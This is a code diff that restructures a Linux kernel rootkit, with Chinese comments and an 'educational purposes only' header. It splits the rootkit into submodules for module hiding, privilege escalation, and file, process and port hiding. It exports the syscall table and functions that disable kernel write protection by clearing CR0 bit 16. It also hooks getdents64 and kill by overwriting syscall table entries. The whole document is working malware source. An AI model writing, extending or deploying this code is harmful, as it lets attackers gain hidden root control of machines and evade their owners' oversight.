@@ -5,33 +5,7 @@
  * Warning: This is for educational and research purposes only
  */
 
-#include <linux/init.h>
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/syscalls.h>
-#include <linux/kallsyms.h>
-#include <linux/unistd.h>
-#include <linux/slab.h>
-#include <linux/uaccess.h>
-#include <linux/proc_fs.h>
-#include <linux/seq_file.h>
-#include <linux/fs.h>
-#include <linux/cred.h>
-#include <linux/uidgid.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
-#include <linux/inet.h>
-#include <net/tcp.h>
-#include <net/udp.h>
-#include <linux/version.h>
-#include <linux/kprobes.h>
-#include <linux/ftrace.h>
-
-#define MODULE_NAME "rootkit"
-#define HIDE_PREFIX "rk_"
-#define PROC_ENTRY "rootkit_control"
-#define MAGIC_UID 31337
-#define MAGIC_GID 31337
+#include "rootkit.h"
 
 // 全局变量
 static struct list_head *module_previous;
@@ -76,9 +50,26 @@ static asmlinkage long (*original_getdents)(const struct pt_regs *);
 static asmlinkage long (*original_kill)(const struct pt_regs *);
 
 // 系统调用表相关
-static unsigned long *sys_call_table;
-static void disable_write_protection(void);
-static void enable_write_protection(void);
+void disable_write_protection(void);
+void enable_write_protection(void);
+
+// 外部模块函数声明
+extern int init_module_hiding(void);
+extern void cleanup_module_hiding(void);
+extern int init_privilege_escalation(void);
+extern void cleanup_privilege_escalation(void);
+extern int init_file_hiding(void);
+extern void cleanup_file_hiding(void);
+extern int init_process_hiding(void);
+extern void cleanup_process_hiding(void);
+extern int init_port_hiding(void);
+extern void cleanup_port_hiding(void);
+
+// 导出系统调用表和保护函数给子模块使用
+unsigned long *sys_call_table;
+EXPORT_SYMBOL(sys_call_table);
+EXPORT_SYMBOL(disable_write_protection);
+EXPORT_SYMBOL(enable_write_protection);
 
 // 查找系统调用表
 static unsigned long *find_sys_call_table(void) {
@@ -99,14 +90,14 @@ static unsigned long *find_sys_call_table(void) {
 }
 
 // 禁用写保护
-static void disable_write_protection(void) {
+void disable_write_protection(void) {
     unsigned long cr0 = read_cr0();
     clear_bit(16, &cr0);
     write_cr0(cr0);
 }
 
 // 启用写保护
-static void enable_write_protection(void) {
+void enable_write_protection(void) {
     unsigned long cr0 = read_cr0();
     set_bit(16, &cr0);
     write_cr0(cr0);
@@ -355,17 +346,60 @@ static int __init rootkit_init(void) {
     sys_call_table[__NR_kill] = (unsigned long)hooked_kill;
     enable_write_protection();
     
+    // 初始化子模块
+    if (init_module_hiding() != 0) {
+        printk(KERN_ERR "[%s] Failed to initialize module hiding\n", MODULE_NAME);
+        goto cleanup_syscalls;
+    }
+    
+    if (init_privilege_escalation() != 0) {
+        printk(KERN_ERR "[%s] Failed to initialize privilege escalation\n", MODULE_NAME);
+        goto cleanup_module_hiding;
+    }
+    
+    if (init_file_hiding() != 0) {
+        printk(KERN_ERR "[%s] Failed to initialize file hiding\n", MODULE_NAME);
+        goto cleanup_privilege;
+    }
+    
+    if (init_process_hiding() != 0) {
+        printk(KERN_ERR "[%s] Failed to initialize process hiding\n", MODULE_NAME);
+        goto cleanup_file_hiding;
+    }
+    
+    if (init_port_hiding() != 0) {
+        printk(KERN_ERR "[%s] Failed to initialize port hiding\n", MODULE_NAME);
+        goto cleanup_process_hiding;
+    }
+    
     // 创建proc接口
     proc_entry = proc_create(PROC_ENTRY, 0666, NULL, &proc_fops);
     if (!proc_entry) {
         printk(KERN_ERR "[%s] Cannot create proc entry\n", MODULE_NAME);
-        return -1;
+        goto cleanup_port_hiding;
     }
     
     printk(KERN_INFO "[%s] Rootkit loaded successfully\n", MODULE_NAME);
     printk(KERN_INFO "[%s] Control interface: /proc/%s\n", MODULE_NAME, PROC_ENTRY);
     
     return 0;
+
+cleanup_port_hiding:
+    cleanup_port_hiding();
+cleanup_process_hiding:
+    cleanup_process_hiding();
+cleanup_file_hiding:
+    cleanup_file_hiding();
+cleanup_privilege:
+    cleanup_privilege_escalation();
+cleanup_module_hiding:
+    cleanup_module_hiding();
+cleanup_syscalls:
+    disable_write_protection();
+    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
+    sys_call_table[__NR_kill] = (unsigned long)original_kill;
+    enable_write_protection();
+    return -1;
 }
 
 // 模块清理
@@ -393,6 +427,13 @@ static void __exit rootkit_exit(void) {
     if (proc_entry) {
         proc_remove(proc_entry);
     }
+    
+    // 清理子模块
+    cleanup_port_hiding();
+    cleanup_process_hiding();
+    cleanup_file_hiding();
+    cleanup_privilege_escalation();
+    cleanup_module_hiding();
     
     // 清理隐藏文件列表
     list_for_each_entry_safe(hf, hf_tmp, &hidden_files, list) {
